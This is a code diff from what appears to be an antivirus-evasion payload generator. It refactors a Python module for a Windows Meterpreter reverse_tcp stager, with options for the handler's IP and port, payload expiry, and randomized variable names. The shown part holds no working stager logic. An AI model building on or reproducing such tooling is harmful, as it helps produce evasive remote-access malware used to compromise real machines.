@@ -10,26 +10,25 @@ from modules.common import helpers
 from modules.common import encryption
 from datetime import date
 from datetime import timedelta
+from modules.common.pythonpayload import PythonPayload
 
-class Payload:
+class Payload(PythonPayload):
     
     def __init__(self):
+        PythonPayload.__init__(self)
         # required options
         self.description = "pure windows/meterpreter/reverse_tcp stager, no shellcode"
-        self.language = "python"
         self.rating = "Excellent"
-        self.extension = "py"
         
         # optional
         # options we require user interaction for- format is {Option : [Value, Description]]}
-        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
-                                 "use_pyherion" : ["N", "Use the pyherion encrypter"],
-                                 "LHOST" : ["", "IP of the metasploit handler"],
-                                 "LPORT" : ["4444", "Port of the metasploit handler"],
-                                 "expire_payload" : ["X", "Optional: Payloads expire after \"X\" days"]}
+        self.required_options["LHOST"] = ["", "IP of the metasploit handler"]
+        self.required_options["LPORT"] = ["4444", "Port of the metasploit handler"]
+        self.required_options["expire_payload"] = ["X", "Optional: Payloads expire after \"X\" days"]
         
         
     def generate(self):
+        self._validateArchitecture()
         
         # randomize all of the variable names used
         shellCodeName = helpers.randomString()
